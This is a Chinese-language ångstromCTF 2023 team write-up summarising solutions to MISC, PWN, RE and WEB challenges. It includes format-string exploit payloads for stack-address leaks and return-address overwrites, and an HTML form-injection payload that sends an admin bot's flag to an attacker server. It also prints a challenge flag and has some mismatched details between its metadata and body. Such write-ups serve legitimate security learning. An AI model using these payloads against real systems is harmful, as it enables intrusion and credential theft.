---
title: ångstromCTF Writeup -VP-Union战队
contest: ångstromCTF
year: 2023
difficulty: mixed
vuln_type: pwn_unknown
tags: [fmt-string, %*c-arbitrary-write, jinja2-SSTI, SVG-XSS, erlang-bytecode, Elixir-BEAM, BEAM-amd64, race-condition, XOR]
attack_chain: PWN slack fmt 字符串 %25$p 泄栈 + %*Nc%25$hn 多次单字节写改 rbp 跳到 one_gadget/RE checkers XOR(anextremelycomplicatedkeythatisdefinitelyuselessss, [0x32,0x26...])/RE Bananas Elixir BEAM 字节码反汇编 Elixir.Bananas main/check/convert_input 函数还原/WEB brokenlogin 25 字节限制 + render_template_string(indexPage % custom_message) 注入 <form action=http://vps/ method=POST> 让 admin bot 提交带 flag 的表单
key_payload: slack sla(b'Professional): ', (b'%' + str((i + 3)&0xffff).encode() + b'c%25$hn').ljust(0xd,b'a'))  # %*c 任意写
one_liner: VP-Union 战队 ångstromCTF 2023 联合参赛 WP，复盖 fmt 字符串 %*c 改 rbp、Elixir BEAM 反编译、Jinja2 SSTI 等多元领域。
lesson: fmt 字符串 %*c$hn 系列可实现任意地址单字节写；BEAM 字节码通过 .beam 头部 Module: + Attributes: + Compilation Info: + //Function 区块手工反汇编；Jinja2 `render_template_string(page % custom_message)` 中 % 用户可控可注入。
quality: high
---

# ångstromCTF 2023 Writeup -VP-Union战队

## 概览
星盟 Polaris + Chamd5 Vemon 联合战队 56 名参赛 WP，覆盖 MISC/PWN/RE/WEB 多个领域。

## MISC
- **sanity check**: 加入社区即可查看
- **Simon Says**: 自动化脚本循环 0x100 次，每次接 "Combine the first 3 letters of " + word + "with the last 3 letters of " + word，发送 a+b 拼接
- **Admiral Shark**: 招新
- **survey**: 招新

## PWN
### slack
- 格式化字符串两次触发机会，数据写入 /dev/null
- 利用 `%*1$c%56c%13$n` 改栈链触发 ret
- 第二次 `sla(b'leek? ', b'%*12$c%' + str(0xa5916).encode() + b'c%42$n')` 改 ret 为 one_gadget
- one_gadget 适用，但成功率低需多次运行

### noleek
- 类似 slack 思路，%*Nc%N$hn 多次单字节写 rbp + ret
- 泄栈 `%25$p` 拿 stack 地址，计算 ret = stack - 0x110
- 写 5 字节 rbp + 3 字节 ret 指针（one_gadget = libc_base + 0xebcf1）
- 修改循环控制变量 i 让函数返回

## RE

### checkers
签到题 `actf{ive_be3n_checkm4ted_21d1b2cebabf983f}`，验证程序。

### Bananas (Elixir BEAM)
- Module: `Elixir.Bananas` Attributes: `[{vsn, [30426469076575DB017A805FDFD2503F]}]`
- Compilation Info: Erlang/OTP 8.2.3
- 字节码反汇编识别 5 个函数：`__info__/1` / `check/1` / `convert_input/1` / `main/0` / `main/1` / `print_flag/1` / `to_integer/1`
- check/1 逻辑：`is_nonempty_list X[0] -> get_list -> is_eq_exact "bananas" -> +5 -> *1 -> bs_put_utf8`
- main 接受输入 "How many bananas do I have?"，split 后 convert_input 转 integer
- 答案：递归发送 "0 bananas" 到 "n bananas"，直到收到非 "Nope" 输出
- 实际：纯 Erlang bytecode 逆向 + 字符串解析

## WEB
### brokenlogin
- bot 代码：填 password 字段为 process.env.CHALL_BROKENLOGIN_FLAG，提交 form
- 服务端：flask + jinja2，`render_template_string(indexPage % custom_message, fails=fails)` 中 custom_message 用户可控
- 25 字节限制：`len(request.args["message"]) >= 25` 走 fail 分支
- payload：`?message=<form action=http://vps/ method=POST><input name=password></form><!--`
- 触发 admin bot 提交表单到攻击者 VPS，截获 password 字段（=flag）

## 经验提炼
- fmt 字符串 `%*c$hn` 系列通过宽度控制写任意字节到任意栈地址
- BEAM 字节码逆向需熟悉 select_val / is_nonempty_list / bs_put_utf8 等指令
- Elixir 反编译需要从 .beam 头部 + //Function 区块手工复原
- race condition 用 while True 循环 + remote() 重连
- XOR 加密 key 通常以 `anextremelycomplicatedkey` 之类的字符串命名做干扰
